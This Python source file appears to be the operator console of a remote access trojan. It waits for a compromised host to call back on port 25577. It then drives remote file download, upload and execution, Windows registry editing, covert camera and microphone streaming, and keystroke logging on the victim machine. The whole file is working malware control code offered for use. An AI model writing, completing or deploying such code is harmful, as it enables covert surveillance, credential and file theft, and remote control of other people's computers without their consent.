import asyncio
from camera import *
from pynput import keyboard
from microphone import *
from keylogger import *
from fileManager import *
from regedit import *

operation_map = {
    "fileManager": "File manager opened",
    "regManager": "Register manager opened",
    "openCamera": "Camera opened",
    "openMicrophone": "Microphone opened",
    "keylogger": "Keylogger started"
}

async def handle_client(reader, writer, stop_event, GUI):
    """处理客户端连接"""
    try:
        # 接收客户端发送的数据
        data = await reader.read(1024)  # 假设最大数据长度为1024字节
        if not data:
            print("客户端断开连接或未发送数据。")
            writer.close()
            await writer.wait_closed()
            return None

        message = data.decode()
        print(f"接收到客户端的数据: {message}")

        # 尝试解析地址和端口
        try:
            addr, port = message.split(':')
            target_address = (addr, port)
        except ValueError:
            print("[!] 接收到的数据格式错误")
            writer.write("数据格式错误".encode())
            await writer.drain()
            writer.close()
            await writer.wait_closed()
            return None

        # 如果接收到有效数据，发送确认消息
        print(f"向客户端发送确认消息...")
        writer.write("receive".encode())
        await writer.drain()
        print("确认消息发送成功")
        # 关闭与当前客户端的连接
        writer.close()
        await writer.wait_closed()
        print("客户端连接已关闭。")
        if(GUI.target_addr == None):
            GUI.target_addr = target_address
        # 通知主函数停止监听
        stop_event.set()
        return target_address
    except Exception as e:
        print(f"[!] 处理客户端时发生错误: {e}")
        stop_event.set()
        return None

async def connected(GUI):
    try:
        if(GUI.target_addr == None):
            host = "0.0.0.0"  # 监听所有网络接口
            port = "25577"       # 监听端口号
            # 创建停止事件
            stop_event = asyncio.Event()

            # 定义实际的服务器逻辑
            async def server_handler(reader, writer):
                # 调用客户端处理函数
                await handle_client(reader, writer, stop_event, GUI)

            # 启动服务器
            server = await asyncio.start_server(server_handler, host, port)
            addr = server.sockets[0].getsockname()
            print(f"服务端启动，监听地址: {addr}")

            # 等待客户端触发 stop_event 事件
            async with server:
                # 使用 asyncio.wait 监听服务器并等待停止事件
                await stop_event.wait()  # 等待第一次接收到数据后触发服务器停止
                # 一旦 stop_event 触发，关闭服务器
                server.close()
                await server.wait_closed()
                print("服务器已停止监听，继续后续任务...")
        GUI.ipInput.setText(GUI.target_addr[0])
        GUI.portInput.setText(GUI.target_addr[1])
        server_address = (GUI.ipInput.text(), GUI.portInput.text())
        GUI.append_log(
            f"[*] 正在连接到: {server_address[0]}:{server_address[1]}")
        for key in GUI.connections:
            reader, writer = await asyncio.open_connection(*server_address)
            GUI.connections[key]['reader'] = reader
            GUI.connections[key]['writer'] = writer
            operation = key
            writer.write(operation.encode())
            await writer.drain()
            response = await reader.read(1024)
            if (response.decode('utf-8') != operation_map[key]):
                GUI.append_log(
                    f"[!] 操作{operation}响应错误: {response.decode('utf-8')}")
                return
        reader, writer = await asyncio.open_connection(*server_address)
        GUI.append_log(
            f"[*] 已连接到: {server_address[0]}:{server_address[1]}")
    except OSError as e:
        GUI.append_log(f"[!] 网络错误: {e}")
    except Exception as e:
        GUI.append_log(f"[!] 未知错误: {e}")


async def disconnected(GUI):
    for key in GUI.connections:
        GUI.connections[key]['writer'].close()
        await GUI.connections[key]['writer'].wait_closed()
    GUI.append_log("[*] Connection closed")


async def fileManager(GUI, operation):
    # 这里放具体的操作
    GUI.fileList.setEnabled(False)
    GUI.fileDownload.setEnabled(False)
    GUI.fileUpload.setEnabled(False)
    GUI.fileExcute.setEnabled(False)
    try:
        GUI.connections["fileManager"]["writer"]
        GUI.connections["fileManager"]["reader"]
        await clientFileManager(GUI, GUI.connections["fileManager"]["writer"],
                                GUI.connections["fileManager"]["reader"], operation)
    except Exception as e:
        GUI.append_log(f"[!] 文件管理未知错误: {e}")
    finally:
        GUI.fileList.setEnabled(True)
        GUI.fileDownload.setEnabled(True)
        GUI.fileUpload.setEnabled(True)
        GUI.fileExcute.setEnabled(True)


async def regmanager(GUI, action):
    # 这里放具体的操作
    value = GUI.regValueInput.text()
    hive = GUI.regRootKey.text()
    key_path = GUI.regPath.text()
    key_name = GUI.regKeyName.text()

    try:
        if action == "add":
            GUI.regManagerOutput.append(f"[*] 正在添加注册表...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI, GUI.connections["regManager"]["writer"], GUI.connections["regManager"]["reader"], 'add', hive, key_path, key_name, value)

        elif action == "delete":
            GUI.regManagerOutput.append("[*] 正在删除注册表...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI, GUI.connections["regManager"]["writer"], GUI.connections["regManager"]["reader"], 'delete', hive, key_path, key_name)

        elif action == "modify":
            GUI.regManagerOutput.append("[*] 正在修改注册表...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI, GUI.connections["regManager"]["writer"], GUI.connections["regManager"]["reader"], 'modify', hive, key_path, key_name, value)

        elif action == "find":
            GUI.regManagerOutput.append("[*] 正在进行注册表查找...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI, GUI.connections["regManager"]["writer"], GUI.connections["regManager"]["reader"], 'find', hive, key_path, key_name)

        else:
            print("Unknown action")

    except Exception as e:
        GUI.regManagerOutput.append(f"[!] 注册表操作未知错误: {e}")


async def opencamera(GUI):
    try:
        if GUI.openCamera.text() == "开启摄像头":
            GUI.camera_check = True
            operation = "Hello, Server!"
            GUI.connections["openCamera"]["writer"].write(operation.encode())
            await GUI.connections["openCamera"]["writer"].drain()
            GUI.append_log(f"[*] Sent operation: {operation}")

            GUI.append_log("[*] Waiting for response...")
            response = await GUI.connections["openCamera"]["reader"].read(1024)
            GUI.append_log(
                f"[*] Received response: {response.decode('utf-8')}")

            # 切换按钮文本为 "关闭摄像头"
            GUI.openCamera.setText("关闭摄像头")
            # 启动视频流接收
            await receive_video_stream(GUI)
        else:
            # 停止视频流
            GUI.camera_check = False
            GUI.openCamera.setText("开启摄像头")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")


async def openmicrophone(GUI):
    # 这里放具体的操作
    try:
        if GUI.openMicrophone.text() == "开启麦克风":
            GUI.microphone_check = True
            operation = "Hello, Server!"
            GUI.connections["openMicrophone"]["writer"].write(
                operation.encode())
            await GUI.connections["openMicrophone"]["writer"].drain()
            GUI.append_log(f"[*] Sent operation: {operation}")

            GUI.append_log("[*] Waiting for response...")
            response = await GUI.connections["openMicrophone"]["reader"].read(1024)
            GUI.append_log(
                f"[*] Received response: {response.decode('utf-8')}")

            # 切换按钮文本为 "关闭麦克风"
            GUI.openMicrophone.setText("关闭麦克风")
            # 启动语音流接收
            await receive_voice_stream(GUI)
        else:
            # 停止语音流
            GUI.microphone_check = False
            GUI.openMicrophone.setText("开启麦克风")

    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")


async def keylogger(GUI):
    # 这里放具体的操作
    try:
        if GUI.keylogger.text() == "键盘记录":
            GUI.keylogger_check = True
            operation = "start keylogger"
            GUI.connections["keylogger"]["writer"].write(operation.encode())
            await GUI.connections["keylogger"]["writer"].drain()
            GUI.append_log(f"[*] Sent operation: {operation}")

            GUI.append_log("[*] Waiting for response...")
            response = await GUI.connections["keylogger"]["reader"].read(1024)
            GUI.append_log(
                f"[*] Received response: {response.decode('utf-8')}")

            # 切换按钮文本为 "停止键盘记录"
            GUI.keylogger.setText("停止键盘记录")
            # 启动键盘记录接收
            win_manager = KeyloggerManager()
            await receive_keylogger_stream(GUI, win_manager)
        else:
            # 停止键盘记录
            GUI.keylogger_check = False
            GUI.keylogger.setText("键盘记录")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")
